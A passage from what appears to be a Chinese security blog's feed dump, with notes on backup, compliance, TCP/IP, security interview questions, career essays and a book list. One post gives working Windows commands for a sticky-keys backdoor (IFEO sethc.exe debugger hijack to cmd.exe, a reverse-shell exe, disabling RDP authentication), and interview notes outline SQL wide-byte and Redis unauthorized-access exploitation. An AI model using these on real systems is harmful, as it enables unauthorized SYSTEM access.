分支名<br>新建分支并且切换到这个分支<br></code></pre></div></td></tr></table></figure><h1 id="云计算入门"><a href="#云计算入门" class="headerlink" title="云计算入门"></a>云计算入门</h1><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>备份就跟保险差不多。平常你感受不到它的存在，甚至觉得它浪费钱、浪费资源。但是一旦你遇到问题了，你就会发现备份的用处。</p><p>备份用到的技术有多种。</p><ol><li>快照备份</li><li>增量备份。bitmap备份，首次全量备份，后续增量备份。也就是说，好比你认识一个人，你第一次认识他，需要知道他的姓名、性别、年龄、电话号码、微信号等等。你后续对他增进了解，那么不需要删了他的微信号再重新加吧？你肯定只需要了解未知的部分、已经改变的部分。比如说他的电话号码改了，那你手机里的联系方式也需要改吧？</li></ol><p>增量备份的好处是，速度更快，（哪里改了就备份哪里），占用存储空间更小。</p><h2 id="容灾"><a href="#容灾" class="headerlink" title="容灾"></a>容灾</h2><p>两地三备：在一个地点A，建立两个数据中心，当其中一个出问题，将近0秒无缝切换到另一个数据中心来提供服务。当地点A出问题，例如地震，使用地点B的数据中心。这是最高等级的容灾物理建设，提供给需要业务不容许中断的客户使用。</p><p>断点续传</p><h2 id="CDP持续性数据保护"><a href="#CDP持续性数据保护" class="headerlink" title="CDP持续性数据保护"></a>CDP持续性数据保护</h2><p>CDP是业内常规技术，不是什么高精尖的独特的东西。</p><p>CDP备份由日志文件和备份文件组成。如果把一份数据，分为50小份，那么如果每一小份都是完整的，那么这份数据就是完整的。如果某一小份出问题了，只要恢复到之前的数据节点，那么就可以达到数据恢复的目的。</p><p>记录这个数据恢复节点的东西，就是日志文件。</p><h1 id="合规"><a href="#合规" class="headerlink" title="合规"></a>合规</h1><h2 id="等保2-0"><a href="#等保2-0" class="headerlink" title="等保2.0"></a>等保2.0</h2><p>1994年，国务院提出要对信息系统进行等级保护。</p><h1 id="对合规的一些了解"><a href="#对合规的一些了解" class="headerlink" title="对合规的一些了解"></a>对合规的一些了解</h1><h2 id="合规是什么？"><a href="#合规是什么？" class="headerlink" title="合规是什么？"></a>合规是什么？</h2><p>约束员工的行为，防止对公司造成损失。</p><ul><li>商业秘密合规</li></ul><p>例如百度起诉王进侵犯商业秘密</p><p>大疆前员工侵犯商业秘密罪一案</p><p>确保公司商业秘密不被泄露。</p><ul><li>个人信息合规</li></ul><p>酒店住房信息泄露，会导致公司股票下跌，可能会损失数亿元，造成严重的后果。</p><p>保障客户的知情权、控制权、敏感信息等。这是个人信息合规的要求。</p><ul><li>国家秘密合规</li></ul><p>泄露国家秘密将承担刑事责任</p><p>渗透项目需要严格在授权范围内活动</p><p>涉密网络严禁一机两用</p><ul><li>资本信息合规</li></ul><p>所在公司规定严禁内部员工短线交易（6个月内买卖）、</p><p>国家规定禁止内幕交易。公司发现后，按照交易额的百分之百支付罚金。违反的员工将有刑事责任与行政责任。</p><p>敏感期买卖股票：重大事件披露后两个交易日之内，禁止买卖股票。</p><ul><li>监管上报合规</li></ul><h2 id="什么是商业秘密"><a href="#什么是商业秘密" class="headerlink" title="什么是商业秘密"></a>什么是商业秘密</h2><p>不为公众所知，能够为权利人带来经济利益的，并且被权利人采取保密措施的信息。</p><h2 id="商业秘密的分级"><a href="#商业秘密的分级" class="headerlink" title="商业秘密的分级"></a>商业秘密的分级</h2><p>绝密：对企业有根本性影响</p><p>机密：重要保密的信息，对企业有严重损害</p><p>秘密：未内部公开的信息，对企业有一定损害</p><p>内部公开：对外公开可能对企业造成损害</p><h2 id="分级信息的处理方式标准"><a href="#分级信息的处理方式标准" class="headerlink" title="分级信息的处理方式标准"></a>分级信息的处理方式标准</h2><p>不同的重要程度的信息，要进行不同的对待。具体看公司的规定，此除省略</p>]]></content>
    
    
    <categories>
      
      <category>unsorted</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unsorted</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>公司培训内容笔记</title>
    <link href="/2020/06/07/12-x/"/>
    <url>/2020/06/07/12-x/</url>
    
    <content type="html"><![CDATA[<p>计算机网络基础。<br>看到一个技术词汇，可以把它是什么、为什么、怎么样、怎么用、难点，不假思索的说出来，那么就是完整熟练的水平。</p><h2 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h2><p>tcp/ip协议解决了不同计算机互联的问题。那么是如何实现的？我们可以打个比方，想象这里有一个平地，我们想在这里建一个酒店。</p><p>首先要打地基，这个地基就相当于物理层。<br>然后钢筋搭建大楼框架，这就是数据链路层。<br>然后填上砖块变成毛坯房，这是网络层。<br>然后硬装修，这是传输层。<br>然后软装修，买家具买七七八八的小东西，垃圾桶，沐浴露啥的，这是应用层。</p><p>那么要想住进这么一个酒店，就需要之前的建设完好无误，否则就不能够正常入住。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-number">4</span>应用层（应用程序网络接口，<span class="hljs-keyword">http</span>，<span class="hljs-keyword">ftp</span>，ssh等等）<br><span class="hljs-number">3</span>传输层（端口连接端口，tcp协议，udp协议。其中tcp协议是面向连接的，要进行传输控制。）<br><span class="hljs-number">2</span>网络层（两台计算机进行正确的数据包转发，进行正确的路由。icmp协议，ping命令查询数据包是否可达、tracert数据包跟踪）<br><span class="hljs-number">1</span>数据链路层（物理介质访问。mac地址，arp地址解析协议，mac地址与ip地址的映射）<br></code></pre></div></td></tr></table></figure><h3 id="传输层tcp与udp协议的区别"><a href="#传输层tcp与udp协议的区别" class="headerlink" title="传输层tcp与udp协议的区别"></a>传输层tcp与udp协议的区别</h3><p>tcp是面向连接，会对数据包进行传输控制，具有超时重传等机制，确保数据完整到达。</p><p>udp是无连接的，数据包到不到要看网络层的情况。效率更高，但是不可靠。</p><h2 id="ipv4与ipv6"><a href="#ipv4与ipv6" class="headerlink" title="ipv4与ipv6"></a>ipv4与ipv6</h2><p>一台网络设备，一个ipv4地址。就跟家里的门牌号一样。</p><p>ipv4，由32位二进制数字表示，可以转换为十进制数字。常用的ip地址就是使用点分十进制进行表示的。</p><p>ip地址可以分为公有地址和私有地址、保留地址。</p><ul><li>公有地址（外网IP）</li><li>私有地址（内网IP）是为了局域网保留的。<br>区别是公网地址不可重复，私有地址可以重复使用。也就是说192.168.1.1这个私有地址，全球的局域网中不知道有多少台计算机都在使用，就像不知道有多少个村子里在使用王二、狗蛋这种小名一样。而公网地址是全球唯一的，一个公有地址对应着一台单独的网络设备。</li><li>保留地址。当计算机无法通过dhcp自动分配ip的时候，就会使用保留地址。<code>169.254.0.0~169.254.255.255</code>。比方说，婴儿<br>所以公网地址经常会不够用。在这种情况下，ipv6协议出现了。ipv6协议号称能够给地球上的每一粒沙子分配一个ipv6地址。</li></ul>]]></content>
    
    
    <categories>
      
      <category>unsorted</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unsorted</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应届生的面试题（三）</title>
    <link href="/2020/05/19/11-x/"/>
    <url>/2020/05/19/11-x/</url>
    
    <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>有空再写，没空就自己找答案吧。。</p><h2 id="TCP-为什么三次握手而不是两次握手"><a href="#TCP-为什么三次握手而不是两次握手" class="headerlink" title="TCP 为什么三次握手而不是两次握手"></a>TCP 为什么三次握手而不是两次握手</h2><p><a href="https://blog.csdn.net/lengxiao1993/article/details/82771768">https://blog.csdn.net/lengxiao1993/article/details/82771768</a></p><p>为了实现可靠数据传输， TCP 协议的通信双方， 都必须维护一个序列号， 以标识发送出去的数据包中， 哪些是已经被对方收到的。为了实现可靠传输，发送方和接收方始终需要同步( <strong>SYN</strong>chronize )序号。</p><p>如果只是两次握手， 至多只有连接发起方的起始序列号能被确认， 另一方选择的序列号则得不到确认</p><p>客户端发送一个请求，服务器回复一份序列号，客户端发送我收到了序列号。</p><h2 id="工作组和域的区别"><a href="#工作组和域的区别" class="headerlink" title="工作组和域的区别"></a>工作组和域的区别</h2><ol><li>大小<br>工作组比较小，不超过20台。域用在比较大的网络，成百上千台。</li><li>拓扑图<br>工作组中，所有机器的地位是平等的，一台计算机可以自由的加入或退出一个工作组。</li><li>验证方式<br>在工作组中，用户名、密码存放在本地计算机。如果要登入其他计算机，必须提供用户名，密码；在域中，有一台域控（DC）服务器，其他计算机都要通过DC验证才能加入域。有域权限，可以登入任何域内计算机，无需知道计算机的账号也可以登入。</li><li>网络<br>工作组计算机必须在同一个子网中；域的计算机可以在不同的本地网络中。</li></ol><h2 id="正向代理和反向代理的区别"><a href="#正向代理和反向代理的区别" class="headerlink" title="正向代理和反向代理的区别"></a>正向代理和反向代理的区别</h2><p>正向代理：对服务器来说，客户端是透明的（未知的）。比如说翻墙使用的个人专用服务器，就是正向代理，代理替客户端取回google上的资料，而服务器只知道代理服务器取得了资料，不知道是哪个客户端。</p><p>反向代理：对客户端来说，服务端是未知的。比如说nginx可以做负载分流作用的反向代理服务器，作用是当有很多请求的时候，它会将请求分流，发送到不同的服务器，防止单台服务器因为过载而崩溃。于是客户端只知道<strong>反向代理服务器</strong>替我们取回了请求的资源，而不知道那台具体是哪台服务端发送的。</p><h2 id="sql宽字节注入"><a href="#sql宽字节注入" class="headerlink" title="sql宽字节注入"></a>sql宽字节注入</h2><p>在cms中，对sql注入使用了addslashes函数，对输入的参数进行了转义，单引号前加上反斜杠进行转义。</p><p>在mysql中，使用GBK编码，认为2个字符是一个汉字。在前面加%a1等字符，使前面字符和反斜杠能够组合为一个汉字，于是反斜杠就不能对单引号进行转义了。</p><h2 id="cobalt-strike的代理"><a href="#cobalt-strike的代理" class="headerlink" title="cobalt strike的代理"></a>cobalt strike的代理</h2><h2 id="redis未授权的利用过程"><a href="#redis未授权的利用过程" class="headerlink" title="redis未授权的利用过程"></a>redis未授权的利用过程</h2><p>linux上好像是 写公钥，利用web服务写马，contrab定时任务<br>然后windows是利用自启动服务，还有web服务，没有web服务就只能重启</p><h2 id="csrf和ssrf的区别"><a href="#csrf和ssrf的区别" class="headerlink" title="csrf和ssrf的区别"></a>csrf和ssrf的区别</h2><h2 id="有哪些逻辑漏洞"><a href="#有哪些逻辑漏洞" class="headerlink" title="有哪些逻辑漏洞"></a>有哪些逻辑漏洞</h2><h2 id="浏览器同源策略"><a href="#浏览器同源策略" class="headerlink" title="浏览器同源策略"></a>浏览器同源策略</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-19-11/1.jpg" alt="1"></p>]]></content>
    
    
    <categories>
      
      <category>Interview</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Interview</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息安全行业现状</title>
    <link href="/2020/05/17/01-x/"/>
    <url>/2020/05/17/01-x/</url>
    
    <content type="html"><![CDATA[<h1 id="信息安全行业现状"><a href="#信息安全行业现状" class="headerlink" title="信息安全行业现状"></a>信息安全行业现状</h1><p>1994年4月20日，中国正式接入因特网。</p><p>至今2020年，历史短短26年。</p><p>国内信息安全企业成立时间长的，哪怕是大企业，也就十多年历史。国内院校培养的信息安全人才远远落后于市场要求。而拥有数十年经验的信息安全人才屈指可数。</p><p>院校中能够教授信息安全领域渗透测试方向的老师，可以说是几乎没有。</p><p>从2018年开始在信息安全领域打杂以来，看到的Sec的博士也很年轻，不过二三十岁。不是鄙视年轻人，医学方向我们都知道老医生比年轻医生更有经验，所以经验也是很重要的。而作为有经验的基础——年龄大，也是一个充分不必要条件。就说业内很有名的黑客余弦、tomkeeper（2001-2020，有近20年的经验），也是拥有着多年的行业经验。</p><p>无论是通过信安混口饭吃的、还是以各个大黑阔为目标的各位，都应该踏踏实实努力个<strong>十年</strong>再说。</p><p>虽然</p><ul><li>现在行业各种标准都十分混乱</li><li>许多小公司都没有培养人才的能力和愿望</li><li>很多公司都不注重信息安全</li><li>很多公司注重 销售&gt;技术人员</li><li>技术人员承担承担成才时间极长、单干可能性极低，就业面极窄的风险</li><li>公司更愿意挖人，而不是培养人才<br>因为挖人只需要付工资，而培养人才，一旦培养成为能够上手工作的熟练人员，那么可能跳槽，所有付出的培养成本都打水漂</li><li>是风险也是机遇。很多成熟的行业各种管理标准都很完善。只能熬资历、拼学历，入行晚了就没有发挥的空间了。大头利润都由业内前辈抽走。有哪些成熟行业这里就不举例了，免得杠精来杠。</li></ul><p>但是只要互联网还存在于地球一天、程序员还是由人类编写为止，信息安全都是不愁被AI取代的、不愁没有工作的。</p><h2 id="技术行业的风险"><a href="#技术行业的风险" class="headerlink" title="技术行业的风险"></a>技术行业的风险</h2><p>作者：天玹六<br>链接：<a href="https://www.zhihu.com/question/54696826/answer/601826541">https://www.zhihu.com/question/54696826/answer/601826541</a><br>来源：知乎<br>著作权归作者所有，转载请联系作者获得授权。</p><p>其实所有技术岗都面临四重风险：门槛极高，成才时间极长，单干可能性极低，就业面极窄，并且越牛B的技术岗这四个特征越发突出。<br>（举例：诺斯诺普格鲁曼公司的核动力航空母舰造船厂及B2幽灵隐形轰炸机工厂，什么进去了你还想跳出来单干？？还想跳槽？？<br>除非你有本事飞出太阳系，否则可能性不是很大）风险总是需要有人承担的，我认为这个点正是中外工业企业一个最本质的差异。</p><p>在发达资本主义国家，风险是由企业承担大部分，个人承担小部分（如承诺不裁员，应届生明明没有产出仍然高薪先养着，<br>技术方向晋升的报酬与管理方向持平甚至略高，行业联盟不搞恶性竞争等，个人往往仅承担行业的系统风险），<br>而在我国，就业风险全部由个人承担(如随时裁员，应届生没有产出那就先吃屎，做技术的永远是狗，行业永远只搞恶性竞争)。更加恶劣的是，个人非但需要承担全部风险，大部分企业还会利用技术人员个人命运与企业命运捆绑，放弃工作的成本极高的事实（比如我的放弃成本就足以令90%以上的机械工程师打消放弃的念头，但是与其让我放弃生命的尊严而苟活于机械行业，我宁愿放弃生命，我要不是31岁还能啃老估计现在已经重新投胎了），来压低技术人员的报酬水平。</p><p>如果有善良的企业不这样做，就会劣币驱逐良币，反而死得更快。（举例：X东前几年不是很牛逼吗？帮快递小哥交五险一金，呵呵呵，现在是按国家规定交五险一金的X东活不下去，还是不交的X丰X通X达活不下去？以前交多了现在降一点，被千夫所指啊，一开始就不交不就什么事都没有了吗？）</p><p>企业这种行为导致的严重后果，我称之为“一代而亡”，即技术员哪怕侥幸能够娶妻生子，他也会拼了老命阻止他的下一代进入自己的行业，说得文绉绉一点，就是“人才断层”。机械人才已经断了多少层，我就不再负能量了。</p><p>ps：现在媒体不正视“人才断层”的恶劣现实，还在鼓吹“XX核心研发团队平均年龄不到30岁”“相比起美国企业平均年龄50岁的死气沉沉，我们这边朝气勃发”…我不知道从什么时候开始，我们国家的工程师变得跟妓女一样越年轻越值钱了？拿机械工程师跟妓女相提并论，这也太过抬举机械工程师了吧？每个妓女都用得起iphone，机械工程师用得起吗？</p><h2 id="技术岗位，初级过剩高级紧缺"><a href="#技术岗位，初级过剩高级紧缺" class="headerlink" title="技术岗位，初级过剩高级紧缺"></a>技术岗位，初级过剩高级紧缺</h2><p>作者：胡嵩<br>链接：<a href="https://www.zhihu.com/question/356982241/answer/1010277323">https://www.zhihu.com/question/356982241/answer/1010277323</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>前面有答主已经很简短有力的回答了： 初级过剩，高级紧缺。其实以我这么多年的招聘经验（发出1000+ offer， 面试数倍人）来看，<br>市场的供给情况比这个还要糟糕， 或者说对于有志在技术领域发展的程序员朋友， 前景比你想象的还要好。<br>市场上90%的程序员达不到大厂的entry level（准入门槛），也就是狼厂的T3，给到正常应届毕业生的及格线。<br>注意这个讨论的全集并不是初级程序员， 而是全部相关专业的程序员。也就是说市场上很多工作多年的『资深』程序员也达不到这个标准。<br>T3是啥要求呢？ 不管是前端、后端、架构还是算法，<br>只要能 熟练掌握语言和工具 ，靠谱的完成模块级的开发工作。<br>按照大家的简历描述， 100%肯定都over qualify了。<br>可真相仍然是， 在所有简历池子里随机抽取100个， 不到10个能通过狼厂T3级别的面试。<br>光笔试就可以干掉一大半。原因在于两个字： 基础。且不说绝大部分非科班出身的程序员， 压根就没打算把基础打牢固。<br>就是我们每年去985 211校招的那些对口专业， 真正把基础学好吃透的学生真是太少了。</p><p>学java搞服务端的同学， 有多少真搞懂了引用计数和回收机制？做前端的同学有多少真的理解从用户事件触发到页面刷新，<br>浏览器侧、网络、后端都发生了什么？常见的算法复杂度放到实际应用问题中， 真没几个能答的上来。</p><p>这些可能在不少程序员眼中属于日常用不着的冷知识， 可是真的到了生产环境中， 面临实际问题的时候， 这些基础问题就能把简历上写着各种精通、各种熟练的高手们难倒。</p><p>能照猫画虎用成熟框架把代码出来是一码事， 能高效交付高质量的工程成果是另一码事。每次大规模校招， 都不免要感慨一下学校的教育和业界的需求脱节。日常的社招， 更让人感叹，大部分程序员的工作都是重复， 没有在技术提升上起到什么作用。所以， 真正有技术追求的朋友们，不要关心统计数据， 机会大把。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>粘滞键后门</title>
    <link href="/2020/05/15/11-x/"/>
    <url>/2020/05/15/11-x/</url>
    
    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.compass-security.com/2018/02/no-need-to-break-in-use-the-backdoor/">https://blog.compass-security.com/2018/02/no-need-to-break-in-use-the-backdoor/</a></li><li><a href="https://mochazz.github.io/2017/07/29/shift/#%E5%81%B7%E5%A4%A9%E6%8D%A2%E6%97%A5">https://mochazz.github.io/2017/07/29/shift/#%E5%81%B7%E5%A4%A9%E6%8D%A2%E6%97%A5</a></li><li><a href="https://blog.csdn.net/fageweiketang/article/details/88317656">2020年5月11日，确定该方法有效。粘滞键后门详述</a></li></ul><h2 id="失败的操作"><a href="#失败的操作" class="headerlink" title="失败的操作"></a>失败的操作</h2><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> <span class="hljs-keyword">c</span>:\windows\system32<br><span class="hljs-keyword">move</span> sethc.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span>.bak#重命名sethc.<span class="hljs-keyword">exe</span>为sethc.<span class="hljs-keyword">exe</span>.bak<br><span class="hljs-keyword">copy</span> /<span class="hljs-keyword">y</span> cmd.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span><br>全都提示拒绝访问<br>本地管理员权限不行、<span class="hljs-built_in">system</span>权限也不行。<br></code></pre></div></td></tr></table></figure><h2 id="成功的操作"><a href="#成功的操作" class="headerlink" title="成功的操作"></a>成功的操作</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">move C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\u</span>ser<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\p</span>.exe C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\p</span>.exe   #将p.exe移动到另一个地址，p.exe是一个反弹shell的exe.<br><br>#需要本地管理员权限<br>REG ADD &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage File Execution Options<span class="hljs-symbol">\s</span>ethc.exe&quot; /t REG_SZ /v Debugger /d &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot; /f<br><br>#在登陆面板输入5个shift，即可获得反弹的system权限shell<br>缺点，在登陆以后，就会丢失反弹连接。<br></code></pre></div></td></tr></table></figure><p>使用场景：在3389远程登陆的时候，无需登陆，调出system权限cmd.exe</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">在受害机器设置user authentication，不需要验证。那么其他机器登入的时候，就会无需验证获得登陆面板。<br>PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\A</span>dministrator&gt; REG ADD &quot;HKLM<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\T</span>erminal Server<span class="hljs-symbol">\W</span>inStations<span class="hljs-symbol">\R</span>DtyLayer /t REG_DWORD /d 0<br><br>---<br>受害机器替换cmd.exe，在登陆面板5个shift调出cmd.exe<br>REG ADD &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage File Execution Options<span class="hljs-symbol">\s</span>ethc.exe&quot; /t REG_SZ /v Debugger /d &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot; /f<br><br>---<br>管理员权限命令开启3389远程登陆<br>REG ADD HKLM<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\T</span>erminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br><br>关闭3389端口<br>REG ADD HKLM<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\T</span>erminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f<br><br>windows 10 无效<br>windows 2008 R2 有效<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应届生的面试原题（二）二进制安全/web安全面试题</title>
    <link href="/2020/05/13/04-x/"/>
    <url>/2020/05/13/04-x/</url>
    
    <content type="html"><![CDATA[<p>启**辰的面试题 </p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-13-04/1.jpg" alt="1"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-13-04/2.jpg" alt="2"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-13-04/3.jpg" alt="3"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-13-04/4.jpg" alt="4"></p>]]></content>
    
    
    <categories>
      
      <category>Interview</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Interview</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论我国的35岁中年危机</title>
    <link href="/2020/05/12/04-x/"/>
    <url>/2020/05/12/04-x/</url>
    
    <content type="html"><![CDATA[<h1 id="论我国的35岁中年危机"><a href="#论我国的35岁中年危机" class="headerlink" title="论我国的35岁中年危机"></a>论我国的35岁中年危机</h1><p>事实一：劳动法规定在公司满十年，就很难开除。</p><p>劳动者不存在过失的，用人单位需要提供补偿金。假如工作10年，1个月工资2万，那么一次性补偿20万。<br>在公司工作满十年，公司辞退员工，需要法定条件，即员工存在过错，或者经上方协商仍不能确定员工职责的，或者因经营困难需裁员的，公司可以辞退；</p><p>但是，若员工有因患职业病或者因工负伤并被确认丧失或者部分丧失劳动能力的或患病或者负伤，在规定的医疗期内的，公司不得辞退有过错的员工或因经营困难要裁员的员工。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、用人单位与劳动者解除劳动关系，没有任何合法理由，也没有支付经济补偿，劳动者不存在《劳动合同法》<span class="hljs-number">39</span>条规定的情形，可以认定该用人单位行为属于《劳动合同法》<span class="hljs-number">87</span>条规定的违法解除劳动合同情形，应该支付赔偿金，即每工作一年支付<span class="hljs-number">2</span>个月的本人工资，俗称<span class="hljs-number">2</span>N；<br><br><span class="hljs-attribute">2</span>、用人单位依据《劳动合同法实施条例》第<span class="hljs-number">19</span>条规定情形与劳动者解除劳动关系的，其中符合《劳动合同法》<span class="hljs-number">46</span>条规定的，应该支付你经济补偿金，即每工作一年支付一个月本人工资，N；符合《劳动合同法》第<span class="hljs-number">40</span>条，并且没有提前<span class="hljs-number">1</span>个月通知劳动者的还应多支付<span class="hljs-number">1</span>个月工资作为代通知金，俗称N+<span class="hljs-number">1</span>；<br></code></pre></div></td></tr></table></figure><p>规避办法一：比如说华为，不会跟员工签10年以上的合同。25岁研究生毕业，工作十年，就到35岁。<br><a href="https://www.zhihu.com/question/357459810">如何看待网传网易裁员，让保安把身患绝症的 5 年老员工赶出公司一事？</a></p><hr><p>事实二：中国人口多，竞争大，内卷化。普通的岗位高中都可以做的事，需要本科生。本科可以做的事情，需要研究生甚至博士。我就不举例了，免得杠精来杠。加班太多。就算清华毕业的，加班到猝死。<a href="https://www.sohu.com/a/107005613_173435">36岁清华毕业生加班猝死</a></p><p>办法二：搞清楚你为什么总是在加班。可能是表面功夫，公司需要你加班。可能是任务太多，不加班做不完。可能是领导分配任务不合理。可能是你的能力太差，不加班做不完。</p><hr><p>事实三：中国贫富差距巨大。凭劳动致富的是少数。凭婚姻致富、关系致富、买房子致富、继承致富、贪污致富.etc更多。你加班不会致富，只会使得你的老板致富。</p><p>事实四：35岁还没走上管理岗，作为工程师确实很难找到工作。大牛除外。但是厉害的人总是少数。作为普通人需要一条后路。</p><p>事实五：中国生育率低下，进入超级老龄化国家后，未必有现在这种35岁就不要了这种风气。生育率从一千七百万降到几百万一年，未来还会不缺劳动力吗？不到那一天我也不知道。</p><p>办法三：出路1，去好的外企，遵守劳动法、没有年龄歧视的那种。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-12-04/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200512155011.jpg"></p><p>出路2，可以转行不做辛苦的工作。虽然钱少，但是没办法。也可以转行做老师，培训20出头的年轻人。</p><p>出路3，攒够钱的话，可以直接退休不工作。需要攒钱、理财。</p><p>希望很小的出路4，做到公司管理层，或者创业成功，直接财务自由。</p><hr><p>事实六：今年经济形势差，最好不要跳槽。</p><p>可以看看这个回答：找工作时单位普遍要求 35 岁以下，那 35 岁以上的人都干什么去了？ - 沈世钧的回答 - 知乎 <a href="https://www.zhihu.com/question/283474944/answer/485146851">https://www.zhihu.com/question/283474944/answer/485146851</a></p><p>找工作时单位普遍要求 35 岁以下，那 35 岁以上的人都干什么去了？ - 莫也的回答 - 知乎<br><a href="https://www.zhihu.com/question/283474944/answer/560686982">https://www.zhihu.com/question/283474944/answer/560686982</a> </p><p>国内就这个环境，不多说了。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防测试书籍推荐（持续更新）</title>
    <link href="/2020/05/11/01-x/"/>
    <url>/2020/05/11/01-x/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th>序列号</th><th>分类</th><th>书名</th><th>出版时间</th></tr></thead><tbody><tr><td>1</td><td>web</td><td>《白帽子讲web 安全》</td><td>2014年</td></tr><tr><td>2</td><td>渗透实战</td><td>The Hacker Playbook 3（红队版）中文版</td><td>2019年</td></tr><tr><td>3</td><td>渗透实战</td><td>《黑客攻防技术宝典：Web 实战篇 ( 第 2版 )》</td><td>2012年</td></tr><tr><td>4</td><td>渗透实战</td><td>《黑客攻防技术宝典系统实战篇》</td><td>2010年</td></tr><tr><td>5</td><td>工具类</td><td>《渗透测试实践指南：必知必会的工具与方法》</td><td></td></tr><tr><td>6</td><td>工具类</td><td>《 Metasploit 渗透测试魔鬼训练营》</td><td>2013年版</td></tr><tr><td>7</td><td>工具类</td><td>《 Kali 渗透测试技术实战》</td><td>2014年出版</td></tr><tr><td>8</td><td>二进制</td><td>《0day安全：软件漏洞分析技术（第2版）》</td><td>2011年出版</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>backup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>backup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透入门（五）金票据、银票据</title>
    <link href="/2020/05/10/09-x/"/>
